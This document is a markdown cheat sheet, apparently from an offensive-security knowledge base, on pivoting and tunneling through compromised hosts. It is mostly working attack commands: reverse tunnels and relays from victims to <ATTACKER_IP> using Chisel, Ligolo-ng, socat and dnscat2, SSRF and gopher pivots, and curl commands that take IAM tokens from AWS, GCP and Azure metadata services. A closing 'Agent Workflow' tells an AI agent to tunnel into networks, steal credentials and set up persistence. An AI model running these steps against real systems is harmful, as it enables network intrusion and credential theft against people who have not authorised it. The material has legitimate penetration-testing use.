# Pivoting and Tunneling

> **Summary**: Pivoting allows an attacker to route traffic through a compromised host to reach otherwise inaccessible internal networks, services, or cloud metadata endpoints.
> **Impact**: Access to internal services, lateral movement, cloud credential theft, bypassing network segmentation.
> **Typical Severity**: High (enables further exploitation of internal targets)

---

## Detection

### Indicators
- Unexpected outbound connections from DMZ or web servers to internal subnets
- SSH sessions with port forwarding flags (`-L`, `-R`, `-D`) in process listings
- Unusual SOCKS proxy listeners on non-standard ports (1080, 9050, 8080)
- Chisel, Ligolo, or other tunneling binaries appearing on compromised hosts

### Manual Detection (from attacker perspective)
- After initial access, check network interfaces and routing tables:
```bash
# Linux
ifconfig && ip route && cat /etc/resolv.conf
arp -a
netstat -antp

# Windows
ipconfig /all && route print
arp -a
netstat -ano
```

- Identify reachable internal subnets:
```bash
# Linux ping sweep
for i in {1..254}; do (ping -c 1 172.16.5.$i | grep "bytes from" &); done

# Windows ping sweep
for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"

# PowerShell
1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.16.5.$($_) -quiet)"}
```

---

## SSH Tunneling

### Local Port Forward
Forward a local port through the SSH server to reach an internal target.

```bash
# Syntax: ssh -L <LOCAL_PORT>:<INTERNAL_TARGET>:<TARGET_PORT> <USER>@<SSH_HOST>
ssh -L 8080:10.10.10.20:80 user@<PIVOT_HOST> -N -f

# Access internal web server at http://localhost:8080
# Multiple forwards in one command:
ssh -L 8080:10.10.10.20:80 -L 3306:10.10.10.30:3306 user@<PIVOT_HOST> -N -f
```

### Remote Port Forward
Expose a port on the SSH server that forwards back to the attacker.

```bash
# Syntax: ssh -R <REMOTE_PORT>:<LOCAL_HOST>:<LOCAL_PORT> <USER>@<SSH_HOST>
ssh -R 0.0.0.0:8443:127.0.0.1:443 user@<PIVOT_HOST> -vN

# Now <PIVOT_HOST>:8443 forwards to attacker's port 443
# Requires GatewayPorts yes in sshd_config for non-localhost binding
```

### Dynamic Port Forward (SOCKS Proxy)
Create a SOCKS proxy that routes all traffic through the pivot host.

```bash
# Syntax: ssh -D <LOCAL_PORT> <USER>@<SSH_HOST>
ssh -D 9050 user@<PIVOT_HOST> -N -f

# Configure proxychains (/etc/proxychains4.conf):
# socks5 127.0.0.1 9050

# Use with any tool:
proxychains nmap -sT -Pn -p 80,443,445 10.10.10.0/24
proxychains curl http://10.10.10.20
```

### SSH VPN Tunnel (TUN interface)
```bash
# Requires root on both sides + PermitRootLogin yes + PermitTunnel yes
ssh root@<PIVOT_HOST> -w any:any
# On attacker:
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 && ip link set tun0 up
# On pivot host:
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 && ip link set tun0 up
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
# On attacker, add route:
route add -net 10.10.10.0/24 gw 1.1.1.1
```

---

## Chisel

Chisel creates TCP tunnels transported over HTTP/HTTPS. Single binary, no dependencies. Use the same version on client and server.

Download: `https://github.com/jpillora/chisel/releases`

### Reverse SOCKS Proxy (most common)
```bash
# Attacker (server):
./chisel server -p 8080 --reverse

# Victim (client):
./chisel client <ATTACKER_IP>:8080 R:socks

# Proxychains now works on attacker via 127.0.0.1:1080 (default)
proxychains nmap -sT -Pn 10.10.10.0/24
```

### Forward SOCKS Proxy
```bash
# Victim (server -- needs port exposed):
./chisel server -v -p 8080 --socks5

# Attacker (client):
./chisel client -v <VICTIM_IP>:8080 socks
```

### Port Forward
```bash
# Attacker (server):
./chisel server -p 12312 --reverse

# Victim (client) -- forward victim's internal port 4505 to attacker's port 4505:
./chisel client <ATTACKER_IP>:12312 R:4505:127.0.0.1:4505
```

---

## Ligolo-ng

Modern tunneling tool that creates a TUN interface. Agent + Proxy architecture. No SOCKS overhead.

Download: `https://github.com/nicocha30/ligolo-ng/releases`

### Setup
```bash
# Attacker (proxy):
sudo ./proxy -selfcert
# Create TUN interface:
interface_create --name "ligolo"

# Victim (agent):
./agent -connect <ATTACKER_IP>:11601 -v -accept-fingerprint <FINGERPRINT>

# On attacker proxy console:
session                                          # Select the agent
1
tunnel_start --tun "ligolo"                      # Start tunnel
ifconfig                                         # View agent's networks
interface_add_route --name "ligolo" --route <INTERNAL_SUBNET>/<MASK>
```

### Listener (reverse port forward)
```bash
# Forward agent's port 30000 back to attacker's port 10000:
listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
```

### Access Agent's Localhost
```bash
# Route a special IP to the agent's loopback:
interface_add_route --name "ligolo" --route 240.0.0.1/32
# Now 240.0.0.1 reaches the agent's 127.0.0.1
```

---

## Socat Relays

Single-binary TCP/UDP relay. Useful for simple port forwards on pivot hosts.

```bash
# Basic port forward:
socat TCP4-LISTEN:<LPORT>,fork TCP4:<TARGET_IP>:<RPORT> &

# Port forward through SOCKS:
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:<TARGET>:80,socksport=5678

# SSL-wrapped relay (evade detection):
socat OPENSSL-LISTEN:443,cert=server.pem,fork TCP4:127.0.0.1:8080

# Remote port-to-port (expose SSH through attacker relay):
# Attacker:
socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr
# Victim:
while true; do socat TCP4:<ATTACKER_IP>:443 TCP4:127.0.0.1:22; done
# Connect:
ssh localhost -p 2222 -l <USER>
```

---

## SSRF as Pivoting

[SSRF](../../web/exploitation/vulns/ssrf.md) vulnerabilities can serve as a network pivot without deploying any binary.

```bash
# Access internal services through SSRF:
curl "http://<VULNERABLE_APP>/fetch?url=http://10.10.10.20:8080/admin"

# Cloud metadata pivoting:
curl "http://<VULNERABLE_APP>/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE_NAME>"

# Internal port scan via SSRF (time-based):
# Open port: fast response | Closed port: timeout
for port in 22 80 443 3306 5432 8080; do
  curl -s -o /dev/null -w "%{time_total}" "http://<VULNERABLE_APP>/fetch?url=http://10.10.10.20:$port"
  echo " - port $port"
done

# Gopher protocol for internal service exploitation:
curl "http://<VULNERABLE_APP>/fetch?url=gopher://10.10.10.20:6379/_<REDIS_COMMANDS>"
```

---

## Proxychains Configuration

```bash
# /etc/proxychains4.conf (or /etc/proxychains.conf)

# Use strict_chain for a single proxy, dynamic_chain for multiple
dynamic_chain

# DNS through proxy (important for internal resolution)
proxy_dns

[ProxyList]
# SOCKS5 via SSH dynamic forward:
socks5 127.0.0.1 9050

# SOCKS5 via Chisel:
# socks5 127.0.0.1 1080

# Chain multiple proxies (double pivot):
# socks5 127.0.0.1 9050
# socks5 127.0.0.1 1081
```

### Nmap through Proxychains
```bash
# ICMP and SYN scans cannot go through SOCKS -- must use TCP connect scan
proxychains nmap -sT -Pn -p 22,80,443,445,3389 <INTERNAL_TARGET>

# Faster alternative: use Nmap only for port discovery, then proxychains for service interaction
```

---

## sshuttle

Transparent proxy that routes traffic through SSH without needing SOCKS configuration.

```bash
# Basic usage -- route all traffic to subnet through pivot:
sshuttle -r user@<PIVOT_HOST> 10.10.10.0/24

# With SSH key:
sshuttle -D -r user@<PIVOT_HOST> 10.10.10.0/24 --ssh-cmd 'ssh -i ./id_rsa'

# Route all traffic (VPN mode):
sshuttle -r user@<PIVOT_HOST> 0/0
```

---

## Cloud Metadata Pivoting

When pivoting through cloud instances, target the metadata service for credential theft.

```bash
# AWS IMDSv1:
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE_NAME>

# AWS IMDSv2 (requires token):
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE_NAME>

# GCP:
curl -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token

# Azure:
curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

---

## Additional Tools

### Windows-Specific

```cmd
# netsh port proxy (requires local admin):
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.20 connectport=4444
netsh interface portproxy show v4tov4
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444

# PuTTY Plink (dynamic SOCKS proxy from Windows):
plink.exe -D 9050 user@<PIVOT_HOST>
```

### DNS Tunneling (dnscat2)
```bash
# Attacker:
ruby dnscat2.rb --dns host=<ATTACKER_IP>,port=53,domain=<DOMAIN> --no-cache
# Victim:
./dnscat2 --dns host=<ATTACKER_IP>,port=53
# Port forward within dnscat2 session:
listen 127.0.0.1:8080 10.10.10.20:80
```

### Cloudflared Tunnel
```bash
# Quick tunnel -- expose local service without inbound firewall rules:
cloudflared tunnel --url http://localhost:8080
# Creates https://<RANDOM>.trycloudflare.com -> 127.0.0.1:8080
```

---

## Tools

| Tool | Usage |
|------|-------|
| [Chisel](https://github.com/jpillora/chisel) | `chisel server -p 8080 --reverse` / `chisel client <IP>:8080 R:socks` |
| [Ligolo-ng](https://github.com/nicocha30/ligolo-ng) | TUN-based tunneling, agent/proxy model |
| [sshuttle](https://github.com/sshuttle/sshuttle) | `sshuttle -r user@host 10.0.0.0/24` |
| [Proxychains](https://github.com/haad/proxychains) | `proxychains <COMMAND>` -- route through SOCKS |
| [socat](https://linux.die.net/man/1/socat) | `socat TCP-LISTEN:<PORT>,fork TCP:<TARGET>:<PORT>` |
| [dnscat2](https://github.com/iagox86/dnscat2) | DNS tunneling for restricted egress environments |
| [rpivot](https://github.com/klsecservices/rpivot) | Reverse SOCKS proxy through NTLM proxies |
| [Cloudflared](https://github.com/cloudflare/cloudflared) | Outbound-only tunnels via Cloudflare edge |
| [FRP](https://github.com/fatedier/frp) | Reverse proxy supporting TCP/UDP/HTTP/SOCKS |
| [ngrok](https://ngrok.com) | `ngrok tcp 4444` -- quick public tunnel |

---

## Agent Workflow
> Step-by-step instructions for an AI agent to set up pivoting and tunneling through compromised hosts.

### Phase 1: Network Assessment
1. After gaining initial access to a host, enumerate network interfaces and routes:
   ```
   # Linux
   ifconfig && ip route && cat /etc/resolv.conf && arp -a
   # Windows
   ipconfig /all && route print && arp -a
   ```
2. Identify reachable internal subnets:
   ```
   # Linux ping sweep
   for i in {1..254}; do (ping -c 1 <INTERNAL_SUBNET>.$i | grep "bytes from" &); done
   ```
3. Determine available tools on the compromised host:
   - SSH client available? --> SSH tunneling
   - Can upload binaries? --> Chisel or Ligolo-ng
   - Python available? --> socat relay or custom script
   - Only web access? --> SSRF as pivot
4. Assess egress rules: which outbound ports are allowed?

### Phase 2: Tunnel Setup
1. **SSH Dynamic SOCKS proxy** (if SSH access to pivot host):
   ```
   ssh -D 9050 <USER>@<PIVOT_HOST> -N -f
   # Configure proxychains: socks5 127.0.0.1 9050
   ```
2. **Chisel reverse SOCKS** (if binary upload possible):
   ```
   # Attacker: ./chisel server -p 8080 --reverse
   # Victim: ./chisel client <ATTACKER_IP>:8080 R:socks
   ```
3. **Ligolo-ng** (for TUN-based tunneling without SOCKS overhead):
   ```
   # Attacker: sudo ./proxy -selfcert
   # Victim: ./agent -connect <ATTACKER_IP>:11601 -v -accept-fingerprint <FP>
   ```
4. **sshuttle** (transparent routing without proxychains):
   ```
   sshuttle -r <USER>@<PIVOT_HOST> <INTERNAL_SUBNET>/24
   ```
5. **Port forward** (for specific service access):
   ```
   ssh -L <LOCAL_PORT>:<INTERNAL_TARGET>:<TARGET_PORT> <USER>@<PIVOT_HOST> -N -f
   ```

### Phase 3: Internal Reconnaissance
1. Configure proxychains with the established tunnel
2. Scan internal hosts through the tunnel:
   ```
   proxychains nmap -sT -Pn -p 22,80,443,445,3389 <INTERNAL_SUBNET>/24
   ```
3. Probe discovered internal web services:
   ```
   proxychains curl http://<INTERNAL_HOST>
   ```
4. Check for cloud metadata endpoints from the pivot host:
   ```
   curl http://169.254.169.254/latest/meta-data/
   ```

### Phase 4: Next Steps
- Feed discovered internal hosts to service-specific enumeration
- If cloud metadata accessible: steal IAM/managed identity credentials -- see [AWS](../../web/exploitation/cloud/aws.md), [Azure](../../web/exploitation/cloud/azure.md), [GCP](../../web/exploitation/cloud/gpc.md)
- Set up additional pivots for multi-hop access (double pivoting)
- Transfer exploitation tools to the pivot host for further attacks
- Establish persistence on the pivot host if authorized

## Decision Tree

```
START: Initial access to a host with internal network connectivity
  |
  +--> Enumerate network interfaces and reachable subnets
  |
  +--> Select tunneling method:
  |      |
  |      +--> SSH available? --> Dynamic SOCKS (-D) or local forward (-L)
  |      +--> Binary upload possible?
  |      |      |
  |      |      +--> Full subnet access needed? --> Ligolo-ng (TUN interface)
  |      |      +--> Simple SOCKS proxy sufficient? --> Chisel reverse SOCKS
  |      |
  |      +--> Only web access? --> SSRF as network pivot
  |      +--> DNS only egress? --> dnscat2 DNS tunnel
  |
  +--> Configure proxychains with tunnel endpoint
  |
  +--> Internal recon: port scan, service discovery, metadata check
  |
  +--> Multi-hop needed?
         |
         +--> Yes --> Chain another tunnel through discovered host
         +--> No --> Proceed with internal exploitation
```

## Success Criteria

- [ ] Network interfaces and routing tables enumerated on pivot host
- [ ] Internal subnets identified via ping sweep or ARP table
- [ ] Tunnel established (SSH/Chisel/Ligolo-ng/sshuttle)
- [ ] Proxychains configured and verified
- [ ] Internal port scan completed through tunnel
- [ ] Cloud metadata endpoint checked from pivot host
- [ ] Discovered internal services documented for further testing

## References

- [HackTricks -- Tunneling and Port Forwarding](https://book.hacktricks.wiki/generic-hacking/tunneling-and-port-forwarding.html)
- [Chisel Documentation](https://github.com/jpillora/chisel)
- [Ligolo-ng Documentation](https://github.com/nicocha30/ligolo-ng)
- [SSH Tunneling Explained](https://www.ssh.com/academy/ssh/tunneling)
- Related: [SSRF](../../web/exploitation/vulns/ssrf.md) | [Command Injection](../../web/exploitation/vulns/command-injection.md)
